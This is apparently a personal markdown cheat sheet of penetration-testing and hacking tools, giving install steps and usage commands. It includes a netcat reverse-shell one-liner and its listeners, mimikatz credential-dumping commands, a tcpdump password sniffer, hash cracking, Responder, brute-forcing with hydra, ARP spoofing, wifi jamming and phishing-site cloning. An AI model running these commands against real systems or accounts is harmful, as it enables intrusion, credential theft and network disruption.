# Hack Tools
#### BloodHound
BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.

https://github.com/BloodHoundAD/BloodHound

#### Empire & Starkiller
```
https://github.com/BC-SECURITY/Empire
```
```
https://github.com/BC-SECURITY/Starkiller
```
1- installing starkiller.

2- installing Empire. 

3- setting up starkiller. 

  - cd empire
  - sudo ./empire --rest
  - cd ..
  - sudo ./starkiller.AppImage --no-sandbox. 
  
4- login to starkiller. 

  - uri: 127.0.0.1:1337
  - user: empireadmin
  - pass: password123
  
```
powershell/credentials/mimikatz/command

token::elevate
privilege::debug
sekurlsa::logonPasswords

```

#### nc reverce
on target
```
rm /tmp/f; mkfifo /tmp/f; nc $ip 4444 0</tmp/f | /bin/bash >/tmp/f 2>$1
```
on attacker use pwncat Johnhammond
```
python -m pwncat -lp 4444
```
or only nc
```
nc -lnvp 4444
```
#### pwncat by John Hammond
https://github.com/calebstewart/pwncat


#### Just cool chat sv
https://rosettacode.org/wiki/Chat_server#Python

#### John The Ripper - om mac

https://github.com/magnumripper/JohnTheRipper

https://gist.github.com/reggi/2faadedd925789a3d25196f2a036ecc6
```
brew install openssl
brew link openssl --force

git clone https://github.com/magnumripper/JohnTheRipper jumbo
cd jumbo/src
./configure
make clean && make -s

pip install bsddb3
```


#### tunnel through ssh
https://github.com/sshuttle/sshuttle
https://superuser.com/questions/62303/how-can-i-tunnel-all-of-my-network-traffic-through-ssh
```
brew install sshuttle
If you need to have python@3.8 first in your PATH run:
  echo 'export PATH="/usr/local/opt/python@3.8/bin:$PATH"' >> ~/.zshrc

For compilers to find python@3.8 you may need to set:
  export LDFLAGS="-L/usr/local/opt/python@3.8/lib"

For pkg-config to find python@3.8 you may need to set:
  export PKG_CONFIG_PATH="/usr/local/opt/python@3.8/lib/pkgconfig"
```
```
./sshuttle -r username@sshserver 0.0.0.0/0 -vv
```

#### hashcat
```
brew install hashcat
```
use to crack win cred:
```
hashcat -m 1000 -a 0 -o winpass2.txt --remove hash ~/Software/Wordlists/rockyou.txt
```
#### tcpdump
capture packets
```
tcpdump -tttt -nn -XX -vvv -s0 -i any -w tet.cap
tcpdump -i eth0 -s 0 -v -n -l | egrep -i "POST /|GET /|Host:"
tcpdump port http or ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|lo=|login=|user=|username=|pw=|passw=|passwds=|password=|pass:|user:|username:|password:|login:|pass |user '
```
```
-i any : Listen on all interfaces just to see if you’re seeing any traffic.
-i eth0 : Listen on the eth0 interface.
-D : Show the list of available interfaces
-n : Don’t resolve hostnames.
-nn : Don’t resolve hostnames or port names.
-q : Be less verbose (more quiet) with your output.
-t : Give human-readable timestamp output.
-tttt : Give maximally human-readable timestamp output.
-X : Show the packet’s contents in both hex and ASCII.
-XX : Same as -X, but also shows the ethernet header.
-v, -vv, -vvv : Increase the amount of packet information you get back.
-c : Only get x number of packets and then stop.
-s : Define the size of the capture in bytes. Use -s0 to get everything, unless you are intentionally capturing less.
-S : Print absolute sequence numbers.
-e : Get the ethernet header as well.
-q : Show less protocol information.
-E : Decrypt IPSEC traffic by providing an encryption key.
```
https://github.com/the-tcpdump-group/tcpdump
https://www.tcpdump.org/


#### crackmapexec
https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference
```
```
https://github.com/byt3bl33d3r/CrackMapExec
#### responder.py

capture smb ... auth
```
./Responder.py -I eth0 -wrf
```
https://github.com/lgandx/Responder
https://github.com/SpiderLabs/Responder

#### exploitdb (searchsploit)

The Exploit Database is an archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers.

###### mac install
```
brew update && brew install exploitdb
```
usage :
```
searchsploit afd windows local
searchsploit -t oracle windows
searchsploit -p 39446
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -s Apache Struts 2.0.0
searchsploit linux reverse password
searchsploit -j 55555 | json_pp
```
https://github.com/offensive-security/exploitdb

#### sqlmap

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
```
sqlmap -r inject.sql --technique=U --batch
```
https://github.com/sqlmapproject/sqlmap

#### wfuzz

all kind of header and wordlist ... to request

The Web Fuzzer.
Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.

```
wfuzz -u http://xxxx/xx.php -H FUZZ:127.0.0.1 -w <wordlist>
wfuzz -u http://xxxx/xx.php -H FUZZ:127.0.0.1 -w <wordlist> -p 127.0.0.1:8080:HTTP
wfuzz -u http://xxxx/xx.php -H FUZZ:FUZ2Z -w <wordlist> -w <secoundWordlist>
wfuzz -hh <89(show if return more than this Char)> -u http://xxxx/xx.php -H FUZZ:FUZ2Z -w <wordlist> -w <secoundWordlist>
```

https://github.com/xmendez/wfuzz

some Important Headers:
```
X-Forwarded-For: localhost
X-Real-IP: 12.12.31.12
X-Forwarded-Host: example.com
X-Forwarded-Proto: https
...
```

#### ippsec

search hacks in videos

https://ippsec.rocks

#### linpeaz

Linux Privilege Escalation Awesome Script

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git

#### steghide

Steghide is a steganography program that is able to hide data in various kinds
of image- and audio-files.

https://github.com/StefanoDeVuono/steghide

#### Binwalk

Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.

https://github.com/ReFirmLabs/binwalk

#### strings

check string files
```
strings test.jpg
```

#### nikto

Nikto web server scanner

https://github.com/sullo/nikto

https://cirt.net/Nikto2

mac : brew install nikto

#### gobuster

Gobuster is a tool used to brute-force:

    URIs (directories and files) in web sites.
    DNS subdomains (with wildcard support).
    Virtual Host names on target web servers.
    
```
gobuster dir -u https://domain -w ~/Software/Wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt
```
https://github.com/OJ/gobuster

#### nmap

Fully scan and ...
```
nmap -vv -sV -sC -oN <output> <IP>
```
Vuln Script
```
nmap -sV -vv --script vuln <TARGET_IP>
```
ping-sweep(only see up ip(s))
```
nmap -sn 192.168.1.0/24
```
very basic scan :| (T4 is (veryfast) speed)
```
nmap -T4 <IP>
```
scan All port full speed(-A = all detection ,-O = os detection / -T4 = Speed / -p- = all ports  ) take long time
```
nmap -T4 -A -p- <IP>
nmap -T4 -A -p22,80,514,443,111,53 <IP>
```
nmap scripts path :
```
/usr/share/nmap/scripts
/usr/local/share/nmap/scripts
```
sample use script in nmap:
```
nmap -p 443 --script=all
nmap -p 443 --script=ssl-enum-ciphers <ip/url>
```
https://github.com/nmap/nmap

#### Unicorn

Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory

https://github.com/trustedsec/unicorn

#### FakeImageExploiter

https://github.com/r00t-3xp10it/FakeImageExploiter

#### Wifite

Python script for auditing wireless networks.(hack)

https://github.com/derv82/wifite2

#### whois

whois command

```
whois test.com
```

#### theHarvester

theHarvester is a very simple to use, yet powerful and effective tool designed to be used in the early statges of a
penetration test or red team engagement. Use it for open source intelligence (OSINT) gathering to help determine a
company's external threat landscape on the internet.

https://github.com/laramies/theHarvester
```
python3 theHarvester.py -d bonyansystem.com -b all -l 500
theharvester -d microsoft.com -l 500 -b google -h myresults.html
theharvester -d microsoft.com -b pgp
theharvester -d microsoft -l 200 -b linkedin
theharvester -d apple.com -b googleCSE -l 500 -s 300
```

#### Ngrok
use if you dont have portforwarding and neet public ip

https://ngrok.com/
```
ngrok -tcp <PORT>
```
#### localtunnel
Ngrok Alternative
use if you dont have portforwarding and neet public ip

https://localtunnel.github.io/www/
```
npm install -g localtunnel
lt --port 8000
```
#### localhost.run
Ngrok Alternative
use if you dont have portforwarding and neet public ip

http://localhost.run/docs/
```
ssh -R 80:localhost:3000 localhost.run
```


#### Brutesploit
use for Brute Forcing , you can brute force instagram and ...

https://github.com/Screetsec/BruteSploit
```
Brutesploit
```
#### cpscan
find website admin panel

https://github.com/SusmithKrishnan/cpscan
```
python cpscan.py -t <Target> -v
```
#### MITMF
Man In The Middle attack

https://github.com/sensepost/MITMf
```
python mitmf.py -i enp3s0
...
```
#### wpscan
WordPress security scanner

github : https://github.com/wpscanteam/wpscan

Docker : https://hub.docker.com/r/wpscanteam/wpscan/
```
wpscan -u <URL> -e u vp #find users
wpscan -u <URL> --wordlist <LIST> --username <user> -thread <x>
```
#### Burp suite
Burp Suite is a leading range of cybersecurity tools, brought to you by PortSwigger. We believe in giving our users a competitive advantage through superior research.

https://portswigger.net/burp

catch web request:
```
open burpsuit > proxy > inter..on > option > add proxy listener
open browser > edit > prefrence > advanced > Network > connection > setting > add Proxy
```
#### setoolkit
The Social-Engineer Toolkit (SET)

https://github.com/trustedsec/social-engineer-toolkit

Clone Website:
```
1 > 2 > 3 > 2 > <yourIP> > <WEBSITE>
```
#### terminator
open source multi page terminal
```
apt-get install terminator
```

#### ettercap
Ettercap is a comprehensive suite for man in the middle attacks

https://www.ettercap-project.org/

https://github.com/Ettercap/ettercap

#### netdiscover
discover Network
```
netdiscover -r 192.168.137.0/24
```

#### arpspoof
arp spoofing Network

https://github.com/byt3bl33d3r/arpspoof
```
arpspoof -i <eth0> -t <target> -r <gateway>
```

#### xerosploit
Scanner / Spoof / sniff / ...

https://github.com/LionSec/xerosploit
```
git clone https://github.com/LionSec/xerosploit
cd xerosploit && sudo python install.py
sudo xerosploit
```

#### wifijammer
wifi jammer

https://github.com/DanMcInerney/wifijammer
```
python wifijammer -a 00:0E:DA:DE:24:8E -c 2
```

#### exif / exiftool
image hidden data shower

https://github.com/exiftool/exiftool
```
./exiftool t/images/ExifTool.jpg
```
#### fcrackzip
crack zip password

https://github.com/hyc/fcrackzip
```
fcrackzip -D -p <wordlist> -u <zipfile>
```

#### cewl
creating custom word lists

https://github.com/digininja/CeWL
```
cewl -c <url> -w <path>
```

#### wifipumpkin
wifipumpkin3 is powerful framework for rogue access point attack

https://github.com/P0cL4bs/wifipumpkin3
```
usage and installation:
https://wifipumpkin3.github.io/docs/getting-started
```

#### sniffglue
Secure multithreaded packet sniffer

https://github.com/kpcyrd/sniffglue
```
# sniff with default filters (dhcp, dns, tls, http)
sniffglue enp0s25
# increase the filter sensitivity (arp)
sniffglue -v enp0s25
# increase the filter sensitivity (cjdns, ssdp, dropbox, packets with valid utf8)
sniffglue -vv enp0s25
# almost everything
sniffglue -vvv enp0s25
# everything
sniffglue -vvvv enp0s25
```

#### hydra
Brute Force
```
hydra -l <user> -L <wordlist> -p <pass> -P <wordliist> <IP> ssh
hydra -l <user> -P <wordliist> <IP> ftp://<IP>
```
post form
```
hydra -I -L <wordlist> -P <wordliist> <IP> http-post-form '/src/login.php:login_username=^USER^&user_pass=^PASS^:F=<Error Massage>'
```
https://github.com/vanhauser-thc/thc-hydra

on mac : brew install hydra

#### socialfish
Educational Phishing Tool & Information Collector

https://github.com/UndeadSec/SocialFish

#### dirsearch
brute force directories and files in websites.

https://github.com/maurosoria/dirsearch
```
python3 dirsearch.py -u <URL> -e <EXTENSION>
```
